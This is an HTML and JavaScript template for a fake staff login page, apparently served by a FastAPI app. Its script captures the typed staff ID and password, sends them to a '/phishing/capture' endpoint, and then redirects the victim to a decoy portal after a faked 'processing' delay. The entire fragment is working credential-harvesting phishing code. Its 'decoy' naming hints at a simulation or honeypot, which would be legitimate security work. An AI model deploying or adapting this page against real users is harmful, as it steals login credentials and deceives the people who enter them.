        <h2>Staff Login</h2>
        <form id="loginForm">
            <input type="text" id="username" name="username" placeholder="Staff ID (e.g., S123456)" required>
            <input type="password" id="password" name="password" placeholder="Password" required>
            <button type="submit">Sign In</button>

    <script>
        const sessionId = "{{ session_id }}"; // Injected by FastAPI
        document.getElementById("loginForm").addEventListener("submit", async (e) => {
            e.preventDefault();
            const username = document.getElementById("username").value;
            const password = document.getElementById("password").value;

            // Send credentials to /phishing/capture
            await fetch("/phishing/capture", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    session_id: sessionId,
                    username: username,
                    password: password,
                    page: "/login"
                })
            });

            // Redirect to fake portal (after "processing")
            setTimeout(() => {
                window.location.href = `/decoy/${sessionId}/portal`;
            }, 1500);
        });
    </script>
